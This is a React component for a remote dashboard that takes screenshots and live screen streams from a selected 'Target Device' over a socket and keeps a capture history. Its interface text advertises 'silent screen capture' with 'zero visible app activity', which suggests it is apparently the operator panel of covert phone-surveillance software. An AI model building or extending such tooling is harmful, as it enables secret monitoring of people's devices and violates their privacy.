"use client";

import React, { useState, useEffect, useRef } from 'react';
import { 
    Monitor, Play, Square, Camera, Download, Maximize, Minimize, 
    RefreshCw, AlertCircle, Shield, Wifi, WifiOff, CheckCircle2,
    Sliders, Clock, Sparkles, Image as ImageIcon, Trash2
} from 'lucide-react';

interface ScreenViewProps {
    socket: any;
    userUuid: string;
    selectedDeviceId: string | null;
    isOnline: boolean;
    deviceName?: string;
}

interface SavedCapture {
    id: string;
    url: string;
    timestamp: number;
    width?: number;
    height?: number;
}

export default function ScreenView({
    socket,
    userUuid,
    selectedDeviceId,
    isOnline,
    deviceName
}: ScreenViewProps) {
    const [isStreaming, setIsStreaming] = useState(false);
    const [isCapturing, setIsCapturing] = useState(false);
    const [streamQuality, setStreamQuality] = useState<number>(480);
    const [streamFps, setStreamFps] = useState<number>(2);
    const [currentFrame, setCurrentFrame] = useState<string | null>(null);
    const [frameDimensions, setFrameDimensions] = useState<{ width: number; height: number } | null>(null);
    const [statusMessage, setStatusMessage] = useState<{ type: 'info' | 'warning' | 'success' | 'error'; text: string } | null>(null);
    const [isFullscreen, setIsFullscreen] = useState(false);
    const [savedCaptures, setSavedCaptures] = useState<SavedCapture[]>([]);
    const [lastCaptureTime, setLastCaptureTime] = useState<number | null>(null);

    const frameRef = useRef<HTMLImageElement>(null);

    // Socket Event Listeners
    useEffect(() => {
        if (!socket) return;

        const handleScreenFrame = (data: any) => {
            if (!data || !data.frame) return;
            const b64 = data.frame.startsWith('data:image') 
                ? data.frame 
                : `data:image/jpeg;base64,${data.frame}`;
            
            setCurrentFrame(b64);
            setIsCapturing(false);

            if (data.width && data.height) {
                setFrameDimensions({ width: data.width, height: data.height });
            }

            if (!data.isStream) {
                const newCapture: SavedCapture = {
                    id: `screen_${Date.now()}`,
                    url: b64,
                    timestamp: data.timestamp || Date.now(),
                    width: data.width,
                    height: data.height
                };
                setSavedCaptures(prev => [newCapture, ...prev.slice(0, 29)]);
                setLastCaptureTime(Date.now());
                setStatusMessage({ type: 'success', text: 'Screenshot captured successfully' });
            }
        };

        const handleScreenStatus = (data: any) => {
            if (!data) return;
            if (data.status === 'token_needed') {
                setStatusMessage({
                    type: 'warning',
                    text: 'One-time authorization requested on device. Tap "Start Now" on phone.'
                });
            } else if (data.status === 'authorized') {
                setStatusMessage({
                    type: 'success',
                    text: 'Screen capture authorized and active.'
                });
            } else if (data.status === 'denied' || data.error) {
                setIsCapturing(false);
                setIsStreaming(false);
                setStatusMessage({
                    type: 'error',
                    text: data.error || 'Screen capture permission was denied.'
                });
            } else if (data.status === 'stream_started') {
                setIsStreaming(true);
                setStatusMessage({ type: 'info', text: 'Live screen streaming active.' });
            } else if (data.status === 'stream_stopped') {
                setIsStreaming(false);
            }
        };

        const handleScreenSaved = (data: any) => {
            if (data && data.url) {
                setSavedCaptures(prev => prev.map(c => 
                    c.timestamp === data.timestamp ? { ...c, url: data.url } : c
                ));
            }
        };

        socket.on('screen_frame', handleScreenFrame);
        socket.on('screen_status', handleScreenStatus);
        socket.on('screen_saved', handleScreenSaved);

        return () => {
            socket.off('screen_frame', handleScreenFrame);
            socket.off('screen_status', handleScreenStatus);
            socket.off('screen_saved', handleScreenSaved);
        };
    }, [socket]);

    // Handle single screenshot capture
    const handleCaptureScreenshot = () => {
        if (!selectedDeviceId || !isOnline || !socket) return;
        setIsCapturing(true);
        setStatusMessage({ type: 'info', text: 'Requesting screenshot frame...' });

        socket.emit('screen_capture', {
            uuid: userUuid,
            targetDeviceId: selectedDeviceId,
            quality: 85
        });

        // Safety timeout in case device takes long to respond
        setTimeout(() => {
            setIsCapturing(false);
        }, 12000);
    };

    // Handle toggle live stream
    const handleToggleStream = () => {
        if (!selectedDeviceId || !isOnline || !socket) return;

        if (isStreaming) {
            socket.emit('screen_stream_stop', {
                uuid: userUuid,
                targetDeviceId: selectedDeviceId
            });
            setIsStreaming(false);
            setStatusMessage({ type: 'info', text: 'Live stream stopped.' });
        } else {
            socket.emit('screen_stream_start', {
                uuid: userUuid,
                targetDeviceId: selectedDeviceId,
                quality: streamQuality,
                fps: streamFps
            });
            setIsStreaming(true);
            setStatusMessage({ type: 'info', text: 'Starting live screen stream...' });
        }
    };

    // Download current image
    const handleDownloadCurrent = () => {
        if (!currentFrame) return;
        const link = document.createElement('a');
        link.href = currentFrame;
        link.download = `screenshot_${Date.now()}.jpg`;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    };

    const qualityOptions = [
        { val: 360, label: '360p' },
        { val: 480, label: '480p' },
        { val: 720, label: '720p HD' }
    ];

    const fpsOptions = [
        { val: 1, label: '1 FPS' },
        { val: 2, label: '2 FPS' },
        { val: 4, label: '4 FPS' }
    ];

    return (
        <div className={`space-y-4 sm:space-y-5 animate-in fade-in zoom-in-95 duration-400 pb-16 ${
            isFullscreen 
                ? 'fixed inset-0 z-[300] bg-[#090b10] p-3 sm:p-6 flex flex-col justify-between overflow-hidden' 
                : 'relative'
        }`}>
            {/* ── Top Controls Bar ── */}
            <div className="bg-[#12141a]/90 backdrop-blur-xl border border-white/10 rounded-2xl p-3 sm:p-4 flex flex-wrap items-center justify-between gap-3 shadow-xl">
                
                {/* Left: Device Info & Stream indicator */}
                <div className="flex items-center gap-3">
                    <div className={`w-10 h-10 rounded-xl flex items-center justify-center ${
                        isOnline 
                            ? 'bg-violet-500/20 text-violet-300 border border-violet-500/40 shadow-[0_0_15px_rgba(139,92,246,0.3)]' 
                            : 'bg-white/5 text-white/40 border border-white/10'
                    }`}>
                        <Monitor size={20} />
                    </div>
                    <div>
                        <div className="flex items-center gap-2">
                            <span className="text-sm font-black text-white">
                                {deviceName || 'Target Device'}
                            </span>
                            <span className={`text-[10px] font-mono px-2 py-0.5 rounded-full font-bold uppercase tracking-wider flex items-center gap-1 ${
                                isOnline 
                                    ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/30' 
                                    : 'bg-rose-500/10 text-rose-400 border border-rose-500/30'
                            }`}>
                                <span className={`w-1.5 h-1.5 rounded-full ${isOnline ? 'bg-emerald-400 animate-pulse' : 'bg-rose-400'}`} />
                                {isOnline ? 'Connected' : 'Offline'}
                            </span>
                        </div>
                        <div className="text-[11px] text-white/40 font-mono">
                            {isStreaming ? (
                                <span className="text-violet-400 font-bold flex items-center gap-1.5">
                                    <span className="w-2 h-2 rounded-full bg-violet-400 animate-ping" />
                                    Live Screen Mirror ({streamFps} FPS • {streamQuality}p)
                                </span>
                            ) : frameDimensions ? (
                                <span>Resolution: {frameDimensions.width} × {frameDimensions.height}</span>
                            ) : (
                                <span>Zero-latency silent screen capture</span>
                            )}
                        </div>
                    </div>
                </div>

                {/* Right: Actions */}
                <div className="flex flex-wrap items-center gap-2">
                    
                    {/* Quality Selector */}
                    <div className="flex items-center bg-black/40 border border-white/10 rounded-xl p-0.5">
                        {qualityOptions.map(opt => (
                            <button
                                key={opt.val}
                                onClick={() => setStreamQuality(opt.val)}
                                disabled={isStreaming}
                                className={`px-2.5 py-1 text-[11px] font-mono font-bold rounded-lg transition-all ${
                                    streamQuality === opt.val
                                        ? 'bg-violet-500 text-white shadow-[0_0_10px_rgba(139,92,246,0.4)]'
                                        : 'text-white/40 hover:text-white/80'
                                } ${isStreaming ? 'opacity-50 cursor-not-allowed' : 'cursor-pointer'}`}
                            >
                                {opt.label}
                            </button>
                        ))}
                    </div>

                    {/* FPS Selector */}
                    <div className="hidden sm:flex items-center bg-black/40 border border-white/10 rounded-xl p-0.5">
                        {fpsOptions.map(opt => (
                            <button
                                key={opt.val}
                                onClick={() => setStreamFps(opt.val)}
                                disabled={isStreaming}
                                className={`px-2.5 py-1 text-[11px] font-mono font-bold rounded-lg transition-all ${
                                    streamFps === opt.val
                                        ? 'bg-violet-500/80 text-white'
                                        : 'text-white/40 hover:text-white/80'
                                } ${isStreaming ? 'opacity-50 cursor-not-allowed' : 'cursor-pointer'}`}
                            >
                                {opt.label}
                            </button>
                        ))}
                    </div>

                    {/* Single Capture Button */}
                    <button
                        onClick={handleCaptureScreenshot}
                        disabled={!isOnline || isCapturing}
                        className={`px-3.5 py-2 rounded-xl text-xs font-bold font-mono uppercase tracking-wider flex items-center gap-2 transition-all cursor-pointer ${
                            isCapturing
                                ? 'bg-violet-500/30 text-violet-300 border border-violet-500/50 animate-pulse'
                                : 'bg-white/10 hover:bg-white/15 text-white border border-white/15 hover:border-white/30'
                        } disabled:opacity-40 disabled:cursor-not-allowed`}
                        title="Take Instant Screenshot"
                    >
                        {isCapturing ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <Camera size={14} />}
                        <span>{isCapturing ? 'Grabbing...' : 'Snapshot'}</span>
                    </button>

                    {/* Live Stream Button */}
                    <button
                        onClick={handleToggleStream}
                        disabled={!isOnline}
                        className={`px-4 py-2 rounded-xl text-xs font-black uppercase tracking-wider flex items-center gap-2 transition-all cursor-pointer shadow-lg ${
                            isStreaming
                                ? 'bg-rose-500 hover:bg-rose-600 text-white shadow-[0_0_20px_rgba(244,63,94,0.4)]'
                                : 'bg-gradient-to-r from-violet-600 to-indigo-600 hover:from-violet-500 hover:to-indigo-500 text-white shadow-[0_0_20px_rgba(139,92,246,0.35)]'
                        } disabled:opacity-40 disabled:cursor-not-allowed`}
                    >
                        {isStreaming ? (
                            <>
                                <Square size={14} className="fill-current" />
                                <span>Stop Mirror</span>
                            </>
                        ) : (
                            <>
                                <Play size={14} className="fill-current" />
                                <span>Live Mirror</span>
                            </>
                        )}
                    </button>

                    {/* Download Button */}
                    {currentFrame && (
                        <button
                            onClick={handleDownloadCurrent}
                            className="p-2 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 text-white/70 hover:text-white transition-all cursor-pointer"
                            title="Download Current Frame"
                        >
                            <Download size={16} />
                        </button>
                    )}

                    {/* Fullscreen Button */}
                    <button
                        onClick={() => setIsFullscreen(!isFullscreen)}
                        className="p-2 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 text-white/70 hover:text-white transition-all cursor-pointer"
                        title={isFullscreen ? 'Exit Fullscreen' : 'Fullscreen'}
                    >
                        {isFullscreen ? <Minimize size={16} /> : <Maximize size={16} />}
                    </button>
                </div>
            </div>

            {/* ── Status Banner ── */}
            {statusMessage && (
                <div className={`p-3 rounded-xl text-xs font-mono flex items-center justify-between gap-3 border animate-in slide-in-from-top-2 duration-200 ${
                    statusMessage.type === 'warning'
                        ? 'bg-amber-500/10 text-amber-300 border-amber-500/30'
                        : statusMessage.type === 'error'
                        ? 'bg-rose-500/10 text-rose-300 border-rose-500/30'
                        : statusMessage.type === 'success'
                        ? 'bg-emerald-500/10 text-emerald-300 border-emerald-500/30'
                        : 'bg-violet-500/10 text-violet-300 border-violet-500/30'
                }`}>
                    <div className="flex items-center gap-2">
                        {statusMessage.type === 'warning' ? <AlertCircle size={15} /> : <CheckCircle2 size={15} />}
                        <span>{statusMessage.text}</span>
                    </div>
                    <button 
                        onClick={() => setStatusMessage(null)}
                        className="text-white/40 hover:text-white text-[10px] cursor-pointer"
                    >
                        Dismiss
                    </button>
                </div>
            )}

            {/* ── Main Screen Mirror Stage ── */}
            <div className={`relative bg-black/80 rounded-3xl border border-white/10 overflow-hidden flex items-center justify-center ${
                isFullscreen 
                    ? 'flex-1 my-3 max-h-[85vh]' 
                    : 'min-h-[460px] sm:min-h-[560px] max-h-[720px]'
            }`}>
                {currentFrame ? (
                    <div className="relative h-full w-full flex items-center justify-center p-2 sm:p-4">
                        <img
                            ref={frameRef}
                            src={currentFrame}
                            alt="Live Screen"
                            className="max-h-full max-w-full object-contain rounded-2xl shadow-2xl border border-white/10"
                        />

                        {/* Overlay stream stats badge */}
                        {isStreaming && (
                            <div className="absolute top-4 left-4 bg-black/70 backdrop-blur-md border border-white/15 px-3 py-1.5 rounded-full flex items-center gap-2 text-[11px] font-mono text-white">
                                <span className="w-2 h-2 rounded-full bg-rose-500 animate-pulse" />
                                <span className="font-bold">LIVE</span>
                                <span className="text-white/40">•</span>
                                <span className="text-violet-300">{streamFps} FPS</span>
                            </div>
                        )}
                    </div>
                ) : (
                    /* Empty Placeholder Stage */
                    <div className="text-center p-8 max-w-md mx-auto space-y-4">
                        <div className="w-20 h-20 mx-auto rounded-3xl bg-violet-500/10 border border-violet-500/30 flex items-center justify-center text-violet-400 shadow-[0_0_30px_rgba(139,92,246,0.25)]">
                            <Monitor size={36} />
                        </div>
                        <div>
                            <h3 className="text-lg font-black text-white">Screen Mirror & Capture</h3>
                            <p className="text-xs text-white/50 mt-1 leading-relaxed">
                                Real-time display mirroring via hardware-accelerated MediaProjection.
                                Captures live screen frames with zero visible app activity.
                            </p>
                        </div>
                        <div className="pt-2 flex items-center justify-center gap-3">
                            <button
                                onClick={handleCaptureScreenshot}
                                disabled={!isOnline}
                                className="px-4 py-2.5 rounded-xl bg-white/10 hover:bg-white/15 border border-white/20 text-white font-mono font-bold text-xs flex items-center gap-2 cursor-pointer transition-all disabled:opacity-40"
                            >
                                <Camera size={14} />
                                <span>Take Snapshot</span>
                            </button>
                            <button
                                onClick={handleToggleStream}
                                disabled={!isOnline}
                                className="px-4 py-2.5 rounded-xl bg-violet-600 hover:bg-violet-500 text-white font-mono font-bold text-xs flex items-center gap-2 cursor-pointer shadow-[0_0_15px_rgba(139,92,246,0.4)] transition-all disabled:opacity-40"
                            >
                                <Play size={14} className="fill-current" />
                                <span>Start Mirror</span>
                            </button>
                        </div>
                    </div>
                )}
            </div>

            {/* ── Saved Captures Reel ── */}
            {savedCaptures.length > 0 && !isFullscreen && (
                <div className="bg-[#12141a]/90 backdrop-blur-xl border border-white/10 rounded-2xl p-4 space-y-3">
                    <div className="flex items-center justify-between">
                        <div className="flex items-center gap-2">
                            <ImageIcon size={15} className="text-violet-400" />
                            <span className="text-xs font-black uppercase tracking-wider text-white">
                                Capture History ({savedCaptures.length})
                            </span>
                        </div>
                        <button
                            onClick={() => setSavedCaptures([])}
                            className="text-[11px] font-mono text-white/40 hover:text-rose-400 flex items-center gap-1 transition-colors cursor-pointer"
                        >
                            <Trash2 size={12} /> Clear
                        </button>
                    </div>

                    <div className="grid grid-cols-3 sm:grid-cols-6 md:grid-cols-8 gap-2.5">
                        {savedCaptures.map(item => (
                            <div
                                key={item.id}
                                onClick={() => setCurrentFrame(item.url)}
                                className="group relative aspect-[9/16] bg-black/60 rounded-xl overflow-hidden border border-white/10 hover:border-violet-500/60 transition-all cursor-pointer shadow-md"
                            >
                                <img
                                    src={item.url}
                                    alt="Capture"
                                    className="w-full h-full object-cover group-hover:scale-105 transition-transform duration-200"
                                />
                                <div className="absolute inset-0 bg-gradient-to-t from-black/80 via-transparent opacity-0 group-hover:opacity-100 transition-opacity flex items-end p-1.5">
                                    <span className="text-[9px] font-mono text-white/80">
                                        {new Date(item.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })}
                                    </span>
                                </div>
                            </div>
                        ))}
                    </div>
                </div>
            )}
        </div>
    );
}
